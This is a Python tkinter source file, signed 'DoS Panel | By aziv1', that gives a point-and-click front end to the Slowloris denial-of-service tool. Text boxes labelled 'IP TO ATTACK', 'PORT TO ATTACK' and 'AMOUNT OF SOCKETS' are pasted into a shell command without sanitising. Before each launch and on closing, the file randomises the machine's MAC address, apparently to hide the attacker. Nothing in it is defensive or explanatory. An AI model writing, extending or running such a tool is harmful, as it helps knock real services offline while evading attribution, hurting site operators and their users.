from tkinter import *
import tkinter as tk
from tkinter.ttk import *
import os as operating_system
import platform

class dossing_panel(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)

        self.geometry('300x450')
        self.title('Dossing Window')

        #############################
        #      DOSSING PANEL        #
        #############################
        def randomise_mac_linux():
            operating_system.system('sudo python randomise_mac_linux.py wlan0 -r')

        def randomise_mac_win():
            operating_system.system('python randomise_mac_windows.py -r')

        def quit_program():
            os = platform.system()
            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass

            self.destroy()

            print("Quitting Now")

        #STARTING SLOWLORIS
        def startSlowloris():
            command = "slowloris.py"

            os = platform.system()

            #IP TARGET CONFIG
            inp_IP = inputtxt1.get(1.0, "end-1c")
            command = command + " " + inp_IP

            #PORT CONFIG
            inp_P = inputtxt2.get(1.0, "end-1c")
            if inp_P == "":
                command = command
            else:
                command = command + " -p " + inp_P

            #SOCKET COUNT CONFIG
            inp_SOCK = inputtxt3.get(1.0, "end-1c")
            if inp_SOCK == "":
                command = command
            else:
                command = command + " -s " + inp_SOCK
            
            #EXTRA OPTIONS
            inp_EXTRA = inputtxt4.get(1.0, "end-1c")
            if inp_EXTRA == "":
                command = command
            else:
                command = command + " " + inp_EXTRA
            
            
            ################################################################
            # SPOOFERS AND MORE

            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass



            operating_system.system('python ' + command)

        def helpSlowloris():
            operating_system.system('python slowloris.py --help')

        label = Label(self, text ="DoS Panel | By aziv1")
        label.pack(pady = 10)

        #Start Slowloris Button, For Testing
        btn2 = Button(self, text ="Excecute", command = startSlowloris)
        btn2.pack(pady = 10)

        #GET SLOWLORIS HELP
        btn3 = Button(self, text ="Slowloris Help", command = helpSlowloris)
        btn3.pack(pady = 10)

        text = Label(self, text="IP TO ATTACK")
        text.pack(pady=10)

        # TextBox For IP
        inputtxt1 = Text(self, height = 1, width = 20)
        inputtxt1.pack()

        text = Label(self, text="PORT TO ATTACK")
        text.pack(pady=10)

        # TextBox For Port
        inputtxt2 = Text(self, height = 1, width = 20)
        inputtxt2.pack()

        text = Label(self, text="AMOUNT OF SOCKETS")
        text.pack(pady=10)

        # TextBox For Port
        inputtxt3 = Text(self, height = 1, width = 20)
        inputtxt3.pack()

        text = Label(self, text="EXTRA OPTIONS")
        text.pack(pady=10)

        # TextBox For EXTRA
        inputtxt4 = Text(self, height = 1, width = 20)
        inputtxt4.pack()

        # BUTTON For Close
        btn3 = Button(self, text ="Close", command = quit_program)
        btn3.pack(pady = 10)

        # mainloop, runs infinitely
        mainloop()